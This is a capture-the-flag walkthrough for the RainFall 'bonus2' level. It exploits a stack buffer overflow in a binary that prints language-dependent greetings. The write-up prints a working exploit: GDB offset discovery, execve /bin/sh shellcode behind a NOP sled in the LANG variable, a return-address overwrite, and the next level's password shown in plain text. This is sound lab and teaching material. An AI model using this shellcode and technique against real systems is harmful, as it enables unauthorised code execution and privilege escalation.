# Bonus2 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    We can see many functions : 
    - `greetuser` : if language catch up an int, we'll get the greetings either in finnish, dutch or english.
    - `strncpy` : ...
    - `getenv` : we'll have to change the `LANG` on the env. 

## Running the program

1. **Execute the Program with the Correct Input**:  
    Before running the program : 
    ```bash
    export LANG=fi
    [...]
    export LANG=nl
    ```
    We ran the program with the following command:  
    ```bash
    bonus2@RainFall:~$ ./bonus2 wnaseevegieoqhgoeiqhgqoeighoiqoejgpojeqgeqj hello
    Hyvää päivää wnaseevegieoqhgoeiqhgqoeighoiqoejgpojeqghello
    ```

    We can see that after 40 bytes, it concatenates the two strings in args. So we know that we'll have to overwrite to add something in the second args.

    we'll have to know where to find the address of getenv: 
    ```bash
    0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
    run $(python -c 'print "A" * 40')
    x/20s $esp <-----> take one of the address that is available to reach an address inside NOP SLED Instruction
    [OR]
    x/20s *((char**)environ)
    0xbfffff2c = LANG=nl
    ```

    - Then, i'll have to find the offset of the second one, and it depends of the LANG var : 

    ```bash
    export LANG=nl <-----> offset 23
    gdb ./bonus2
    run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
    Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x38614137 in ?? ()              // offset : 23
    ```

    
2. **Trying to overflow the RET value**
    - shellcode
    - put the shellcode in the env LANG, 'nl' for the memcmp, '\x90' for the `nop sled` meaning to find the shellcode easily.
    ```bash
    export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
    ```
    - then send args :
    ```bash
    bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x2c\xff\xff\xbf"')
    Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
    $ cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
    ```

## Moving to bonus3

1. **Swith User to bonus3**:
    Run ```su bonus3```

2. **Authenticate with the Password**:
    We used the password we found.